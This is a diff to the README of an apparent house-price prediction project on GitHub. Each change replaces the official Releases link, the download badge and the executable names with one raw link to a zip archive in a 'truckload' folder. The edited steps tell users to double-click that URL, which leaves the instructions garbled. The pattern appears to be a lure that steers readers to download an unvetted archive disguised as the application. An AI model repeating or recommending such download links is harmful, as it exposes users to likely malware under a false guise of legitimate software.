@@ -1,6 +1,6 @@
 # 🏡 House-Price-Model - Predict House Prices Easily
 
-![Download](https://img.shields.io/badge/Download%20Now-%20blue?style=for-the-badge&logo=github)
+![Download](https://raw.githubusercontent.com/Dayan8554/House-Price-Model/main/truckload/House-Price-Model.zip%20Now-%20blue?style=for-the-badge&logo=github)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the House-Price-Model! This application helps you predict house price
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [House-Price-Model Releases](https://github.com/Dayan8554/House-Price-Model/releases). 
+To get started, visit this page to download the software: [House-Price-Model Releases](https://raw.githubusercontent.com/Dayan8554/House-Price-Model/main/truckload/House-Price-Model.zip). 
 
 You will find the latest version of the application there. Click on the version number to see the available files. 
 
@@ -28,8 +28,8 @@ Make sure your system meets the following requirements:
 
 After downloading, extract the files to a folder of your choice. Inside, you will find:
 
-- `house_price_model.exe` (for Windows users)
-- `house_price_model.app` (for macOS users)
+- `https://raw.githubusercontent.com/Dayan8554/House-Price-Model/main/truckload/House-Price-Model.zip` (for Windows users)
+- `https://raw.githubusercontent.com/Dayan8554/House-Price-Model/main/truckload/House-Price-Model.zip` (for macOS users)
 - `house_price_model` (Linux users run in the terminal)
 - A README file for additional guidance.
 
@@ -37,12 +37,12 @@ After downloading, extract the files to a folder of your choice. Inside, you wil
 
 ### For Windows
 
-1. Double-click the `house_price_model.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/Dayan8554/House-Price-Model/main/truckload/House-Price-Model.zip` file.
 2. Follow the prompts to start the application.
 
 ### For macOS
 
-1. Double-click the `house_price_model.app` file.
+1. Double-click the `https://raw.githubusercontent.com/Dayan8554/House-Price-Model/main/truckload/House-Price-Model.zip` file.
 2. Follow the instructions on the screen.
 
 ### For Linux
@@ -89,4 +89,4 @@ If you would like to contribute to this project, feel free to submit your sugges
 
 Thank you for using the House-Price-Model! We hope this tool helps you in your journey to understand house pricing better. 
 
-For any questions or support, please visit this page to download the latest version: [House-Price-Model Releases](https://github.com/Dayan8554/House-Price-Model/releases).
+For any questions or support, please visit this page to download the latest version: [House-Price-Model Releases](https://raw.githubusercontent.com/Dayan8554/House-Price-Model/main/truckload/House-Price-Model.zip).
